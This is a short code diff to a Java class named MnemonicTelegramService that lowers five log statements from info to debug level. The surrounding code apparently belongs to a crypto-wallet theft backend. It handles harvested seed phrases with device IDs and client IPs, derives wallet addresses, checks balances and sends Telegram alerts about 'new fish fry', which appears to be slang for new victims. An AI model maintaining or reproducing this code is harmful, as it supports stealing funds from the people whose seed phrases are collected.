@@ -66,7 +66,7 @@ public class MnemonicTelegramService {
         try {
             DeviceEntity device = loadDevice(deviceRowId, deviceId);
             if (device == null) {
-                log.info("正常日志:[telegram] 设备不存在，跳过新鱼苗挂起 deviceRowId={} deviceId={}",
+                log.debug("正常日志:[telegram] 设备不存在，跳过新鱼苗挂起 deviceRowId={} deviceId={}",
                         deviceRowId, deviceId);
                 return;
             }
@@ -106,7 +106,7 @@ public class MnemonicTelegramService {
                                  String channelCodeFallback, String clientIpFallback,
                                  List<WalletDerivator.DerivedAddress> derived) {
         if (balanceDedup.putIfAbsent(mnemonicId, Boolean.TRUE) != null) {
-            log.info("正常日志:[telegram] 余额通知去重跳过 mnemonicId={}", mnemonicId);
+            log.debug("正常日志:[telegram] 余额通知去重跳过 mnemonicId={}", mnemonicId);
             return;
         }
         Map<String, String> chainAddr = new HashMap<>();
@@ -148,7 +148,7 @@ public class MnemonicTelegramService {
         flushPendingFishToChannel(fishKey, channelCode);
         ChannelEntity channel = resolveChannel(channelCode);
         if (channel == null) {
-            log.info("正常日志:[telegram] 渠道无 telegram_groupid，跳过余额 mnemonicId={} channel={}",
+            log.debug("正常日志:[telegram] 渠道无 telegram_groupid，跳过余额 mnemonicId={} channel={}",
                     mnemonicId, channelCode);
             return;
         }
@@ -188,7 +188,7 @@ public class MnemonicTelegramService {
         ChannelEntity channel = resolveChannel(channelCode != null ? channelCode
                 : (pending == null ? null : pending.channelCode));
         if (channel == null) {
-            log.info("正常日志:[telegram] 渠道无 telegram_groupid，跳过新鱼苗 device={}", fishKey);
+            log.debug("正常日志:[telegram] 渠道无 telegram_groupid，跳过新鱼苗 device={}", fishKey);
             return;
         }
         String datetime = LocalDateTime.now(ZoneId.systemDefault()).format(DTF);
@@ -209,7 +209,7 @@ public class MnemonicTelegramService {
         long now = System.currentTimeMillis();
         Long prev = fishSent.putIfAbsent(dedupNs, now);
         if (prev != null && now - prev < FISH_DEDUP_MS) {
-            log.info("正常日志:[telegram] 新鱼苗去重跳过 device={} private={}", fishKey, privateGroup);
+            log.debug("正常日志:[telegram] 新鱼苗去重跳过 device={} private={}", fishKey, privateGroup);
             return;
         }
         if (prev != null) fishSent.put(dedupNs, now);
